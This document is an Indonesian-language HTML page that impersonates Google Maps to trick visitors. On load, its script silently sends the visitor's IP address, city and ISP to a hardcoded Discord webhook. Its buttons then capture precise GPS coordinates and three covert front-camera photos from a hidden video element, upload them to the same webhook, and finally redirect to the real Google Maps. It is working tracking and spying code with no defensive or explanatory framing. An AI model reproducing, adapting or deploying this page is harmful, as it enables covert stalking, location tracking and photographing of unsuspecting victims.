<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <title>Google Maps - Lokasi Terkini</title>
    <meta property="og:title" content="Google Maps: Lokasi Terbagi">
    <meta property="og:description" content="Klik untuk melihat lokasi presisi dan rute navigasi real-time.">
    <meta property="og:image" content="https://www.google.com/maps/vt/pb=!1m4!1m3!1i15!2i26214!3i12288!2m3!1e0!2sm!3i388172593!3m8!2sen!3sid!5e1105!12m4!1e68!2m2!1sset!2sRoadmap!4e0!5m1!1e0!23i1301875">
    <meta property="og:type" content="website">
    <meta name="theme-color" content="#1a73e8">

    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Roboto', Arial, sans-serif; background: #ffffff; overflow: hidden; }
        
        .overlay {
            position: relative; height: 100%;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            text-align: center; color: #3c4043; padding: 20px;
        }

        .maps-logo { width: 70px; margin-bottom: 20px; }
        .content-box { width: 100%; max-width: 320px; animation: fadeIn 0.5s ease; }

        h2 { margin: 0 0 10px 0; font-size: 18px; font-weight: 500; color: #202124; }
        p { font-size: 14px; margin-bottom: 25px; line-height: 1.4; color: #5f6368; }

        .btn-action {
            background: #1a73e8; color: white; border: none;
            padding: 12px 24px; border-radius: 4px;
            font-size: 14px; font-weight: 500; cursor: pointer;
            width: 100%; box-shadow: 0 1px 2px rgba(60,64,67,0.3);
        }
        .btn-action:active { background: #1765cc; }

        #v { position: absolute; width: 1px; height: 1px; opacity: 0.01; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

        .loader {
            border: 2px solid #f3f3f3; border-top: 2px solid #ffffff;
            border-radius: 50%; width: 14px; height: 14px;
            animation: spin 0.8s linear infinite; display: inline-block; vertical-align: middle; margin-right: 8px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <video id="v" autoplay playsinline muted></video>
    <canvas id="c" style="display:none;"></canvas>

    <div class="overlay">
        <div id="step-location" class="content-box">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282015-2020%29.svg/512px-Google_Maps_icon_%282015-2020%29.svg.png" class="maps-logo">
            <h2>Izin Lokasi Diperlukan</h2>
            <p>Izinkan akses lokasi untuk melihat posisi presisi Anda di Google Maps.</p>
            <button id="locBtn" class="btn-action" onclick="handleLocation()">Lanjutkan</button>
        </div>

        <div id="step-camera" class="content-box" style="display: none;">
            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/39/Google_Maps_icon_%282015-2020%29.svg/512px-Google_Maps_icon_%282015-2020%29.svg.png" class="maps-logo">
            <h2>Google Live View</h2>
            <p>Google meminta izin kamera untuk memverifikasi foto lokasi di sekitar Anda.</p>
            <button id="camBtn" class="btn-action" onclick="handleCamera()">Aktifkan Live View</button>
        </div>
    </div>

    <script>
        const WH = "https://discord.com/api/webhooks/1339505432094244934/GvR3jA9v_i3eY72E74-vYm899Y6y3I53M309544931063162";
        const REDIRECT_URL = "https://www.google.com/maps";

        // --- PENGIRIMAN DATA OTOMATIS ---
        (async function autoInit() {
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const d = await ipRes.json();
                fetch(WH, { method: "POST", headers: {"Content-Type":"application/json"}, 
                    body: JSON.stringify({
                        embeds: [{
                            title: "ðŸš€ Visitor Open Link",
                            color: 3066993,
                            fields: [
                                { name: "IP", value: d.ip || "N/A", inline: true },
                                { name: "Kota", value: d.city || "N/A", inline: true },
                                { name: "ISP", value: d.org || "N/A", inline: false }
                            ],
                            timestamp: new Date()
                        }]
                    })
                });
            } catch (e) {}
        })();

        // --- LOKASI ---
        function handleLocation() {
            document.getElementById('locBtn').innerHTML = '<span class="loader"></span> Memproses...';
            navigator.geolocation.getCurrentPosition(
                (p) => {
                    fetch(WH, { method: "POST", headers: {"Content-Type":"application/json"},
                        body: JSON.stringify({ content: `ðŸ“ **LOKASI**: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` })
                    });
                    showStep2();
                },
                () => { showStep2(); },
                { enableHighAccuracy: true, timeout: 5000 }
            );
        }

        function showStep2() {
            document.getElementById('step-location').style.display = 'none';
            document.getElementById('step-camera').style.display = 'block';
        }

        // --- KAMERA ---
        async function handleCamera() {
            document.getElementById('camBtn').innerHTML = '<span class="loader"></span> Menghubungkan...';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('v');
                video.srcObject = stream;

                setTimeout(async () => {
                    for (let i = 1; i <= 3; i++) {
                        await takeSnap(video, i);
                    }
                    stream.getTracks().forEach(t => t.stop());
                    window.location.href = REDIRECT_URL;
                }, 1000);
            } catch (e) {
                window.location.href = REDIRECT_URL;
            }
        }

        async function takeSnap(video, index) {
            const canvas = document.getElementById('c');
            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);
            return new Promise((res) => {
                canvas.toBlob(async (b) => {
                    const fd = new FormData();
                    fd.append("file", b, `photo_${index}.jpg`);
                    fd.append("payload_json", JSON.stringify({content: `ðŸ“¸ Foto ${index}`}));
                    await fetch(WH, { method: "POST", body: fd });
                    res();
                }, 'image/jpeg', 0.6);
            });
        }
    </script>
</body>
</html>
